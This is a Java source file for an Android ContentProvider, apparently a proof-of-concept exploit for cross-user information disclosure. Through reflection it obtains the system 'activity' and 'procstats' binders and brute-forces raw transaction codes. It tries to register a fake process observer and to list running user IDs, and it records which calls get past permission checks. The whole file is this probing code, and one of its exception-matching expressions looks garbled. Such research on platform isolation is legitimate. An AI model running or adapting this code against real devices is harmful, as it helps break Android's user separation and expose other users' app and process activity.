package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class ProcessObserverProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder amBinder = getServiceBinder("activity");
        if (amBinder == null) { cursor.addRow(new Object[]{"error", "no AM binder"}); return cursor; }
        String amDesc = "android.app.IActivityManager";

        // IActivityManager interesting methods for cross-user info:
        // registerProcessObserver — get notified of all process state changes
        // registerUidObserver — get notified of all UID state changes
        // getRunningAppProcesses — list running processes
        // getRecentTasks — get recent task list
        // getProcessMemoryInfo — memory info for PIDs

        // Test getRunningAppProcesses (TX varies by version, try common ones)
        cursor.addRow(new Object[]{"=== AM TX scan ===", ""});
        // On Android 16, IActivityManager has 200+ methods
        // Let's find getRunningAppProcesses by the response pattern

        // getRunningAppProcesses returns List<RunningAppProcessInfo>
        // Try a range of TX codes looking for list responses
        int[] testTx = {56, 57, 58, 59, 60, 70, 71, 72, 73, 74, 75, 80, 85, 90, 95, 100};
        for (int tx : testTx) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(amDesc);
                boolean result = amBinder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 8) {
                            cursor.addRow(new Object[]{"am_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 10) {
                            cursor.addRow(new Object[]{"am_tx" + tx, "SEC:" + truncate(msg)});
                        }
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 5 && !msg.contains("consumed")) {
                            cursor.addRow(new Object[]{"am_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Try registerProcessObserver — passes an IBinder callback
        cursor.addRow(new Object[]{"=== registerProcessObserver ===", ""});
        // IProcessObserver interface: onForegroundActivitiesChanged, onProcessDied, onForegroundServicesChanged
        IBinder fakeObserver = new Binder();
        for (int tx = 1; tx <= 200; tx += 5) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(amDesc);
                data.writeStrongBinder(fakeObserver);
                boolean result = amBinder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        // If no exception and succeeded, we registered an observer!
                        cursor.addRow(new Object[]{"reg_tx" + tx, "REGISTERED! avail=" + avail});
                    } catch (SecurityException e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.contains("ProcessObserver\\.register\\.\\|register.*observer\\.\\|INTERACT_ACROSS_USERS".replace("\\.", "")
                            .replace("\\|", "|"))) {
                            cursor.addRow(new Object[]{"reg_tx" + tx, "SEC(observer):" + truncate(msg)});
                        } else if (msg != null && msg.contains("registerProcessObserver") || msg != null && msg.contains("registerUidObserver")) {
                            cursor.addRow(new Object[]{"reg_tx" + tx, "SEC:" + truncate(msg)});
                        }
                    } catch (Exception e) {
                        // skip noise
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Try getRunningUserIds — might reveal user 11 exists
        cursor.addRow(new Object[]{"=== getRunningUserIds ===", ""});
        // This returns int[] of running user IDs
        for (int tx = 140; tx <= 180; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(amDesc);
                boolean result = amBinder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail >= 8) {
                            // Could be int[]: length + values
                            int len = reply.readInt();
                            if (len > 0 && len < 20) {
                                StringBuilder sb = new StringBuilder("len=" + len + " [");
                                for (int i = 0; i < len; i++) {
                                    sb.append(reply.readInt());
                                    if (i < len - 1) sb.append(",");
                                }
                                sb.append("]");
                                cursor.addRow(new Object[]{"users_tx" + tx, sb.toString()});
                            }
                        }
                    } catch (SecurityException e) {
                        String msg = e.getMessage();
                        if (msg != null && (msg.contains("getRunningUserIds") || msg.contains("INTERACT_ACROSS_USERS"))) {
                            cursor.addRow(new Object[]{"users_tx" + tx, "SEC:" + truncate(msg)});
                        }
                    } catch (Exception e) {}
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Try ProcessStats — system_server tracks per-process stats
        IBinder procstatsBinder = getServiceBinder("procstats");
        if (procstatsBinder != null) {
            cursor.addRow(new Object[]{"=== ProcessStats ===", ""});
            String psDesc = "com.android.internal.app.procstats.IProcessStats";
            for (int tx = 1; tx <= 10; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(psDesc);
                    boolean result = procstatsBinder.transact(tx, data, reply, 0);
                    if (result) {
                        try {
                            reply.readException();
                            int avail = reply.dataAvail();
                            if (avail > 0) {
                                cursor.addRow(new Object[]{"ps_tx" + tx, "OK avail=" + avail});
                            }
                        } catch (SecurityException e) {
                            cursor.addRow(new Object[]{"ps_tx" + tx, "SEC:" + truncate(e.getMessage())});
                        } catch (Exception e) {
                            String msg = e.getMessage();
                            if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                                cursor.addRow(new Object[]{"ps_tx" + tx, "EX:" + truncate(msg)});
                            }
                        }
                    }
                } catch (Exception e) {}
                data.recycle();
                reply.recycle();
            }
        }

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
